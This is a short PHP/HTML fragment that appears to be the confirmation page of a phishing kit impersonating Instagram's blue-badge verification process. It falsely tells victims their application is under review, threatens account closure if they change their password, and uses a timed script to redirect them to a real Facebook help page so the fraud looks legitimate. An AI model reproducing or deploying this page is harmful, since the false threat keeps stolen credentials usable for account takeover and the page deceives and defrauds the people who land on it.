...
<br>
	...
	<br>
            <center><h2 class="title">Application successful <?php echo $id; ?><h2>
            <br>
<script>
    setTimeout(function(){   
        window.location="https://www.facebook.com/help/instagram/354736791367645";
        
        }, 5000);
  </script>

<center><p>Your blue badge application has been reviewed. If this review is rejected, don't get discouraged and keep trying.
Do not change your password until we inform you. Otherwise, your application will be canceled and your account will be closed unlimitedly.</p></center>
<br>
          <img src="suc.gif" width="210">
